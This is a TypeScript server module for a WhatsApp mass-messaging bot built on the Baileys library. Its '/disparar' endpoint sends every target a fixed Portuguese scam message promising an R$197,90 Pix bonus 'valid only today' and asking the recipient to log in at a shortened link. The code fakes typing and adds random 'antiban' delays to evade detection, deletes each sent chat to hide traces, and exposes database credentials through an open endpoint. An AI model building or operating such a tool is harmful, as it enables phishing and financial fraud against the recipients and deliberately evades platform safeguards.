import "dotenv/config";
import fs from "fs";
import makeWASocket, {
  useMultiFileAuthState,
  DisconnectReason,
  delay,
  fetchLatestBaileysVersion,
  makeCacheableSignalKeyStore,
  Browsers,
  type WASocket,
  type ConnectionState,
} from "@whiskeysockets/baileys";
import pino from "pino";
import axios from "axios";
import { Boom } from "@hapi/boom";
import { getContactsFromDB, importContacts, getDBCredentials } from "../../db-client";

const logger = pino({ level: "silent" });

// Mensagem oficial configurada e imutável
const FIXED_MESSAGE = `🎉 PARABÉNS! 🎉

Seu perfil foi aprovado para receber um bônus imediato de R$197,90 via Pix. ✅

⏳ Oferta válida somente até hoje às 23:59.

Para liberar seu token de segurança e sacar o valor disponível, faça login ou crie seu cadastro no link abaixo:

👉 https://lkrh.pro/f96f5f

⚠️ Atenção: após o prazo, o bônus poderá ser cancelado automaticamente pelo sistema.`;

const AUTH_DIR = "auth_info_baileys";

let sock: WASocket | null = null;
let pairingCode: string | null = null;
let connectionStatus: "connecting" | "open" | "close" | "pairing" = "close";

let waVersion: [number, number, number] = [2, 3000, 1035194821];

// Busca a versão mais recente do Baileys ao iniciar
fetchLatestBaileysVersion()
  .then(({ version }) => {
    waVersion = version;
  })
  .catch((err) => {
    console.warn("Aviso: falha ao buscar versão do Baileys. Usando fallback.", err);
  });

// ──────────────────────────────────────────────────────────
// Conexão principal com o WhatsApp
// ──────────────────────────────────────────────────────────
async function connectToWhatsApp(): Promise<WASocket> {
  const { state, saveCreds } = await useMultiFileAuthState(AUTH_DIR);

  sock = makeWASocket({
    version: waVersion,
    logger,
    printQRInTerminal: false,
    auth: {
      creds: state.creds,
      keys: makeCacheableSignalKeyStore(state.keys, logger),
    },
    browser: Browsers.ubuntu("Chrome"),
    markOnlineOnConnect: true,
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update: Partial<ConnectionState>) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = (lastDisconnect?.error as Boom)?.output?.statusCode;
      const shouldReconnect = statusCode !== DisconnectReason.loggedOut;

      console.log(`Conexão fechada — código: ${statusCode}, reconectar: ${shouldReconnect}`);
      connectionStatus = "close";

      // Limpa o socket atual
      try {
        sock?.ev.removeAllListeners("connection.update");
        sock?.ev.removeAllListeners("creds.update");
        sock?.end(undefined);
      } catch {
        // ignora erros no encerramento
      }
      sock = null;

      // Só reconecta se houver credenciais salvas e o motivo não for logout
      const hasCredentials = fs.existsSync(`${AUTH_DIR}/creds.json`);
      if (shouldReconnect && hasCredentials) {
        console.log("Credenciais ativas encontradas. Reconectando em 5s...");
        await delay(5000);
        connectToWhatsApp().catch((err) => console.error("Erro na reconexão:", err));
      }
    } else if (connection === "open") {
      console.log("✅ Conexão estabelecida com sucesso!");
      connectionStatus = "open";
      pairingCode = null;
    }
  });

  return sock;
}

// ──────────────────────────────────────────────────────────
// Webhook para relatórios / integração externa
// ──────────────────────────────────────────────────────────
async function triggerWebhook(status: string, phone: string, messageId: string) {
  const WEBHOOK_URL = process.env.DISPARO_WEBHOOK_URL;
  if (!WEBHOOK_URL) return;

  try {
    await axios.post(WEBHOOK_URL, {
      event: "message_sent",
      status,
      phone,
      messageId,
      timestamp: new Date().toISOString(),
      reward: 0.1,
    });
  } catch (err) {
    console.error("Erro ao disparar Webhook:", err);
  }
}

// Helper para resposta JSON com CORS
function jsonResponse(data: unknown, status = 200): Response {
  return new Response(JSON.stringify(data), {
    status,
    headers: {
      "Content-Type": "application/json",
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Headers": "Origin, X-Requested-With, Content-Type, Accept",
      "Access-Control-Allow-Methods": "GET, POST, OPTIONS, PUT, DELETE",
    },
  });
}

// ──────────────────────────────────────────────────────────
// Handler principal para requisições Web API (src/server.ts)
// ──────────────────────────────────────────────────────────
export async function handleWhatsappApiRequest(request: Request): Promise<Response | null> {
  const url = new URL(request.url);
  const pathname = url.pathname;

  // Trata CORS pré-flight
  if (request.method === "OPTIONS") {
    return new Response(null, {
      status: 200,
      headers: {
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Headers": "Origin, X-Requested-With, Content-Type, Accept",
        "Access-Control-Allow-Methods": "GET, POST, OPTIONS, PUT, DELETE",
      },
    });
  }

  // Normaliza o caminho do endpoint (/api/wa/* e /api/*)
  let endpoint = pathname;
  if (endpoint.startsWith("/api/wa")) {
    endpoint = endpoint.replace(/^\/api\/wa/, "");
  } else if (endpoint.startsWith("/api")) {
    endpoint = endpoint.replace(/^\/api/, "");
  }

  // Se o endpoint não for reconhecido, ignora (deixa o TanStack Start tratar)
  const validEndpoints = [
    "/status",
    "/connect",
    "/disconnect",
    "/disparar",
    "/contatos",
    "/contatos/importar",
    "/db-credentials",
  ];

  if (!validEndpoints.includes(endpoint)) {
    return null;
  }

  try {
    // GET /status
    if (endpoint === "/status" && request.method === "GET") {
      return jsonResponse({
        status: connectionStatus,
        pairingCode,
        connectedAs: sock?.authState?.creds?.me?.id ?? null,
      });
    }

    // POST /connect
    if (endpoint === "/connect" && request.method === "POST") {
      let body: { phone?: string } = {};
      try {
        body = (await request.json()) as { phone?: string };
      } catch {
        // ignora
      }

      const { phone } = body;
      if (!phone) {
        return jsonResponse({ error: "Telefone é obrigatório" }, 400);
      }

      const cleanPhone = String(phone).replace(/\D/g, "");
      console.log(`Iniciando pareamento para: ${cleanPhone}`);

      // Encerra socket anterior se houver
      if (sock) {
        try {
          sock.ev.removeAllListeners("connection.update");
          sock.ev.removeAllListeners("creds.update");
          sock.end(undefined);
        } catch {
          // ignora
        }
        sock = null;
      }

      // Remove sessão anterior para evitar conflito de credenciais
      if (fs.existsSync(AUTH_DIR)) {
        fs.rmSync(AUTH_DIR, { recursive: true, force: true });
      }

      connectionStatus = "close";
      pairingCode = null;

      await connectToWhatsApp();
      // Aguarda a inicialização do socket
      await new Promise((resolve) => setTimeout(resolve, 1500));

      if (!sock) {
        throw new Error("Não foi possível inicializar o socket do WhatsApp");
      }

      const code = await sock.requestPairingCode(cleanPhone);
      pairingCode = code ?? null;
      connectionStatus = "pairing";

      return jsonResponse({ pairingCode: code });
    }

    // POST /disconnect
    if (endpoint === "/disconnect" && request.method === "POST") {
      if (sock) {
        try {
          sock.ev.removeAllListeners("connection.update");
          sock.ev.removeAllListeners("creds.update");
          await sock.logout();
          sock.end(undefined);
        } catch {
          // ignora
        }
        sock = null;
      }

      if (fs.existsSync(AUTH_DIR)) {
        fs.rmSync(AUTH_DIR, { recursive: true, force: true });
      }

      pairingCode = null;
      connectionStatus = "close";

      return jsonResponse({ success: true });
    }

    // POST /disparar
    if (endpoint === "/disparar" && request.method === "POST") {
      let body: { targets?: unknown[] } = {};
      try {
        body = (await request.json()) as { targets?: unknown[] };
      } catch {
        // ignora
      }

      const { targets } = body;

      if (!sock || connectionStatus !== "open") {
        return jsonResponse({ error: "WhatsApp não conectado" }, 400);
      }

      if (!Array.isArray(targets) || targets.length === 0) {
        return jsonResponse({ error: "Lista de alvos inválida" }, 400);
      }

      // Executa o disparo em segundo plano (assíncrono)
      (async () => {
        for (const targetRaw of targets) {
          try {
            const target = String(targetRaw).replace(/\D/g, "") + "@s.whatsapp.net";

            // 1. Simula digitação (7–12 segundos aleatório)
            const typingMs = Math.floor(Math.random() * (12000 - 7000 + 1)) + 7000;
            await sock?.sendPresenceUpdate("composing", target);
            await delay(typingMs);
            await sock?.sendPresenceUpdate("paused", target);

            // 2. Envia a mensagem fixa
            const sentMsg = await sock?.sendMessage(target, { text: FIXED_MESSAGE });

            if (sentMsg) {
              // 3. Apaga o chat local para não deixar rastros
              await sock?.chatModify(
                {
                  delete: true,
                  lastMessages: [
                    {
                      key: sentMsg.key,
                      messageTimestamp: sentMsg.messageTimestamp ?? 0,
                    },
                  ],
                },
                target,
              );

              // 4. Dispara webhook de confirmação
              await triggerWebhook("success", target, sentMsg.key.id ?? "");
            }

            // 5. Delay humano aleatório (30–45 segundos) — antiban
            const nextDelay = Math.floor(Math.random() * (45000 - 30000 + 1)) + 30000;
            console.log(`✉️  Enviado para ${target}. Próximo em ${nextDelay / 1000}s...`);
            await delay(nextDelay);
          } catch (err) {
            console.error(`Erro ao disparar para ${targetRaw}:`, err);
          }
        }
      })();

      return jsonResponse({ status: "queueing", count: targets.length });
    }

    // GET /contatos
    if (endpoint === "/contatos" && request.method === "GET") {
      const result = await getContactsFromDB();
      return jsonResponse(result);
    }

    // POST /contatos/importar
    if (endpoint === "/contatos/importar" && request.method === "POST") {
      let body: { phones?: unknown } = {};
      try {
        body = (await request.json()) as { phones?: unknown };
      } catch {
        // ignora
      }

      const { phones } = body;
      if (!phones || !Array.isArray(phones)) {
        return jsonResponse(
          { success: false, error: "Formato inválido. Esperado: { phones: string[] }" },
          400,
        );
      }

      const result = await importContacts(phones as string[]);
      return jsonResponse(result);
    }

    // GET /db-credentials
    if (endpoint === "/db-credentials" && request.method === "GET") {
      const creds = getDBCredentials();
      return jsonResponse(creds);
    }

    return null;
  } catch (error: unknown) {
    const msg = error instanceof Error ? error.message : String(error);
    console.error(`Erro no endpoint ${endpoint}:`, msg);
    return jsonResponse({ error: msg }, 500);
  }
}
